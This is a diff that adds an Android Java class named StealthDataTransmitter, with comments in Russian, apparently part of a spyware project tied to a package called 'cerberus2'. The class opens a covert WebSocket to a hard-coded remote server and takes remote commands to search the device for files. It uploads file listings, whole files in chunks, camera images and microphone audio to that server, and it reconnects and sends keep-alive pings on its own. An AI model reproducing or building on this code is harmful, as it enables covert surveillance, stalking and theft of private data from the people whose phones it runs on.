@@ -1,0 +1,452 @@
+package com.example.locationtracker;
+
+import android.content.Context;
+import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.net.NetworkRequest;
+import org.json.JSONArray;
+import java.io.File;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import okhttp3.*;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.IOException;
+import java.io.ByteArrayOutputStream;
+import java.util.concurrent.TimeUnit;
+import java.util.zip.GZIPOutputStream;
+import android.content.SharedPreferences;
+import java.util.Arrays;
+
+// ИСПРАВЛЕНО: правильный пакет BuildConfig
+import com.example.cerberus2.BuildConfig;
+import static com.example.cerberus2.BuildConfig.API_KEY;
+import static com.example.cerberus2.BuildConfig.SERVER_URL;
+
+public class StealthDataTransmitter {
+    private static final String TAG = "StealthDataTransmitter";
+
+    private static final String BASE_SERVER_URL = SERVER_URL.replace("/api/location", "");
+
+    private Context context;
+    private Handler keepAliveHandler;
+    private Runnable pingRunnable;
+    private OkHttpClient httpClient;
+    private WebSocket webSocket;
+    private Handler mainHandler;
+    private String currentDeviceId;
+
+    public interface CommandListener {
+        void onCommandReceived(String action);
+        void onCommandError(String action, Exception e);
+    }
+
+    private CommandListener commandListener;
+    private volatile boolean connected = false;
+    private volatile boolean networkAvailable = false;
+
+    private int retryCount = 0;
+    private static final int MAX_RETRIES = 5;
+
+    public StealthDataTransmitter(Context context) {
+        this.context = context;
+        this.mainHandler = new Handler(Looper.getMainLooper());
+        this.httpClient = new OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(30, TimeUnit.SECONDS)
+                .writeTimeout(30, TimeUnit.SECONDS)
+                .build();
+        monitorNetworkStatus();
+    }
+
+    public void setCommandListener(CommandListener listener) {
+        this.commandListener = listener;
+    }
+
+    public boolean isConnected() {
+        return webSocket != null && connected && networkAvailable;
+    }
+
+    public void initConnection(String deviceId) {
+        if (deviceId == null || deviceId.equals("null")) return;
+        this.currentDeviceId = deviceId;
+
+        String wsUrl = "wss://location-tracker-server-micv.onrender.com/ws/stealth?deviceId="
+                + deviceId + "&token=" + API_KEY;
+
+        Request request = new Request.Builder().url(wsUrl).build();
+        webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
+            @Override
+            public void onOpen(WebSocket webSocket, Response response) {
+                connected = true;
+                startKeepAlivePing(webSocket);
+            }
+
+            @Override
+            public void onMessage(WebSocket webSocket, String text) {
+                try {
+                    JSONObject json = new JSONObject(text);
+                    if (!json.has("action")) return;
+
+                    String action = json.getString("action");
+                    SharedPreferences prefs = context.getSharedPreferences(
+                            "stealth_commands", Context.MODE_PRIVATE);
+                    SharedPreferences.Editor editor = prefs.edit();
+                    editor.putLong("timestamp", System.currentTimeMillis());
+
+                    String finalAction = action;
+
+                    if ("file_command".equals(action) && json.has("command")) {
+                        try {
+                            JSONObject commandObj = json.getJSONObject("command");
+                            finalAction = commandObj.optString("action", "");
+                            editor.putString("search_keywords",
+                                    commandObj.has("keywords")
+                                            ? commandObj.getJSONArray("keywords").toString() : "[]");
+                            editor.putString("search_extensions",
+                                    commandObj.has("extensions")
+                                            ? commandObj.getJSONArray("extensions").toString() : "[]");
+                            if (commandObj.has("files"))
+                                editor.putString("target_files",
+                                        commandObj.getJSONArray("files").toString());
+                        } catch (Exception e) {
+                            if (commandListener != null)
+                                commandListener.onCommandError("file_command", e);
+                        }
+                    }
+
+                    editor.putString("command", finalAction);
+                    if (json.has("file_path"))
+                        editor.putString("file_path", json.getString("file_path"));
+                    editor.commit();
+
+                    final String dispatchAction = finalAction;
+                    if (commandListener != null) {
+                        mainHandler.post(() -> {
+                            try {
+                                commandListener.onCommandReceived(dispatchAction);
+                            } catch (Exception e) {
+                                commandListener.onCommandError(dispatchAction, e);
+                            }
+                        });
+                    }
+                } catch (Exception e) {
+                    if (commandListener != null)
+                        commandListener.onCommandError("message_parse", e);
+                }
+            }
+
+            @Override
+            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+                connected = false;
+                stopKeepAlivePing();
+                scheduleReconnect(currentDeviceId);
+            }
+
+            @Override
+            public void onClosed(WebSocket webSocket, int code, String reason) {
+                connected = false;
+                stopKeepAlivePing();
+                if (code != 1000) scheduleReconnect(currentDeviceId);
+            }
+        });
+    }
+
+    private volatile boolean reconnecting = false;
+    private Runnable reconnectRunnable;
+
+    private void scheduleReconnect(String deviceId) {
+        if (reconnecting) return;
+        reconnecting = true;
+        if (reconnectRunnable != null) mainHandler.removeCallbacks(reconnectRunnable);
+
+        reconnectRunnable = new Runnable() { // ИСПРАВЛЕНО: анонимный класс вместо лямбды
+            @Override                         // чтобы this ссылался на Runnable, а не на внешний класс
+            public void run() {
+                reconnecting = false;
+                if (!checkNetworkAvailability()) {
+                    mainHandler.postDelayed(this, 10000);
+                    return;
+                }
+                if (webSocket != null) {
+                    try { webSocket.close(1000, "Reconnecting"); } catch (Exception ignored) {}
+                    webSocket = null;
+                }
+                initConnection(deviceId);
+            }
+        };
+        mainHandler.postDelayed(reconnectRunnable, 5000);
+    }
+
+    private void monitorNetworkStatus() {
+        ConnectivityManager cm =
+                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm == null) return;
+        NetworkRequest networkRequest = new NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build();
+        cm.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
+            @Override
+            public void onAvailable(Network network) {
+                networkAvailable = true;
+                if (webSocket != null) scheduleReconnect(currentDeviceId);
+            }
+            @Override
+            public void onLost(Network network) { networkAvailable = false; }
+        });
+    }
+
+    private boolean checkNetworkAvailability() {
+        ConnectivityManager cm =
+                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm == null) return false;
+        Network network = cm.getActiveNetwork();
+        if (network == null) return false;
+        NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+        return caps != null &&
+                (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                 caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR));
+    }
+
+    public void sendFileList() {
+        try {
+            // ИСПРАВЛЕНО: FileManager.getFileList() не существует — используем RemoteFileSystemService
+            RemoteFileSystemService rfs = new RemoteFileSystemService(context);
+            JSONObject filesData = rfs.getDirectoryListing("");
+
+            JSONObject message = new JSONObject();
+            message.put("type", "file_list");
+            message.put("device_id", currentDeviceId);
+            message.put("data", filesData);
+            message.put("timestamp", System.currentTimeMillis());
+
+            if (webSocket != null && isConnected()) {
+                sendCompressedData(message.toString().getBytes());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send file list", e);
+            if (commandListener != null) commandListener.onCommandError("file_list", e);
+        }
+    }
+
+    private static final int CHUNK_SIZE = 256 * 1024;
+
+    public void sendFile(String filePath) {
+        try {
+            File file = new File(filePath);
+            if (!file.exists() || !file.canRead()) return;
+
+            long fileSize = file.length();
+            int totalChunks = Math.max(1, (int) Math.ceil((double) fileSize / CHUNK_SIZE));
+            String fileId = java.util.UUID.randomUUID().toString();
+
+            try (java.io.FileInputStream fis = new java.io.FileInputStream(file)) {
+                byte[] buffer = new byte[CHUNK_SIZE];
+                int bytesRead;
+                int chunkIndex = 0;
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    byte[] chunk = (bytesRead == CHUNK_SIZE)
+                            ? buffer : java.util.Arrays.copyOf(buffer, bytesRead);
+                    String base64Chunk = encodeCompressedData(chunk);
+
+                    JSONObject message = new JSONObject();
+                    message.put("type", "file_chunk");
+                    message.put("device_id", currentDeviceId);
+                    message.put("file_id", fileId);
+                    message.put("filename", file.getName());
+                    message.put("chunk_index", chunkIndex);
+                    message.put("total_chunks", totalChunks);
+                    message.put("total_size", fileSize);
+                    message.put("data", base64Chunk);
+
+                    if (webSocket != null && isConnected()) webSocket.send(message.toString());
+                    else break;
+
+                    chunkIndex++;
+                    try { Thread.sleep(15); } catch (InterruptedException ignored) {}
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send file", e);
+            if (commandListener != null) commandListener.onCommandError("file_send", e);
+        }
+    }
+
+    public void sendCompressedData(byte[] data) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
+            gzipOut.write(data);
+            gzipOut.close();
+            byte[] compressedData = baos.toByteArray();
+
+            JSONObject message = new JSONObject();
+            message.put("type", "compressed_data");
+            message.put("data", android.util.Base64.encodeToString(compressedData, android.util.Base64.NO_WRAP));
+            message.put("compression", "GZIP");
+
+            if (webSocket != null) webSocket.send(message.toString());
+        } catch (IOException e) {
+            Log.e(TAG, "Compression failed", e);
+            if (commandListener != null) commandListener.onCommandError("data_compression", e);
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error in sendCompressedData", e);
+        }
+    }
+
+    private String encodeCompressedData(byte[] data) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
+            gzipOut.write(data);
+            gzipOut.close();
+            return android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
+        } catch (IOException e) {
+            return android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
+        }
+    }
+
+    public void sendImageData(byte[] imageData) {
+        if (currentDeviceId == null) return;
+        if (imageData.length > 500 * 1024) imageData = compressImage(imageData, 90);
+        if (webSocket != null && isConnected()) {
+            try {
+                sendCompressedData(imageData);
+            } catch (Exception e) {
+                if (commandListener != null) commandListener.onCommandError("image_send", e);
+            }
+        }
+        sendImageViaHTTP(imageData, currentDeviceId);
+    }
+
+    private byte[] compressImage(byte[] imageData, int quality) {
+        android.graphics.Bitmap bitmap = null;
+        try {
+            bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            if (bitmap == null) return imageData;
+            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos);
+            byte[] result = baos.toByteArray();
+            baos.close();
+            return result;
+        } catch (Exception e) {
+            return imageData;
+        } finally {
+            if (bitmap != null) bitmap.recycle();
+        }
+    }
+
+    private void sendImageViaHTTP(byte[] imageData, String deviceId) {
+        try {
+            JSONObject payload = new JSONObject();
+            payload.put("type", "image");
+            payload.put("device_id", deviceId);
+            payload.put("data", android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP));
+            payload.put("timestamp", System.currentTimeMillis());
+
+            Request request = new Request.Builder()
+                    .url(BASE_SERVER_URL + "/api/camera/image")
+                    .post(RequestBody.create(MediaType.parse("application/json"), payload.toString()))
+                    .addHeader("Authorization", API_KEY)
+                    .build();
+
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    if (commandListener != null) commandListener.onCommandError("http_image", e);
+                }
+                @Override
+                public void onResponse(Call call, Response response) { response.close(); }
+            });
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to create image payload", e);
+        }
+    }
+
+    public void sendSearchResults(java.util.List<String> filePaths) {
+        if (currentDeviceId == null || webSocket == null || !isConnected()) return;
+        try {
+            JSONArray filesArray = new JSONArray();
+            for (String path : filePaths) filesArray.put(path);
+            JSONObject message = new JSONObject();
+            message.put("type", "search_results");
+            message.put("device_id", currentDeviceId);
+            message.put("files", filesArray);
+            message.put("total", filePaths.size());
+            message.put("timestamp", System.currentTimeMillis());
+            webSocket.send(message.toString());
+        } catch (Exception e) {
+            if (commandListener != null) commandListener.onCommandError("search_results", e);
+        }
+    }
+
+    public void sendAudioData(byte[] audioData) {
+        if (currentDeviceId == null || webSocket == null || !isConnected()) return;
+        try {
+            JSONObject message = new JSONObject();
+            message.put("type", "audio");
+            message.put("device_id", currentDeviceId);
+            message.put("data", encodeCompressedData(audioData));
+            message.put("timestamp", System.currentTimeMillis());
+            message.put("format", "pcm");
+            message.put("sampleRate", 16000);
+            message.put("channels", 1);
+            webSocket.send(message.toString());
+        } catch (Exception e) {
+            if (commandListener != null) commandListener.onCommandError("audio_send", e);
+        }
+    }
+
+    private void startKeepAlivePing(WebSocket ws) {
+        if (keepAliveHandler == null) keepAliveHandler = new Handler(Looper.getMainLooper());
+        pingRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (ws != null) {
+                    try {
+                        JSONObject ping = new JSONObject();
+                        ping.put("type", "ping");
+                        ping.put("timestamp", System.currentTimeMillis());
+                        ws.send(ping.toString());
+                    } catch (Exception ignored) {}
+                    keepAliveHandler.postDelayed(this, 20000);
+                }
+            }
+        };
+        keepAliveHandler.postDelayed(pingRunnable, 20000);
+    }
+
+    private void stopKeepAlivePing() {
+        if (keepAliveHandler != null && pingRunnable != null)
+            keepAliveHandler.removeCallbacks(pingRunnable);
+    }
+
+    public void disconnect() {
+        stopKeepAlivePing();
+        if (webSocket != null) { webSocket.close(1000, "Service stopped"); webSocket = null; }
+        connected = false;
+    }
+
+    public void testConnection(String deviceId) {
+        String testUrl = BASE_SERVER_URL + "/api/devices/" + API_KEY;
+        Request request = new Request.Builder()
+                .url(testUrl)
+                .addHeader("Authorization", API_KEY)
+                .build();
+        httpClient.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
+            }
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                if (response.isSuccessful()) initConnection(deviceId);
+                else mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
+                response.close();
+            }
+        });
+    }
+}
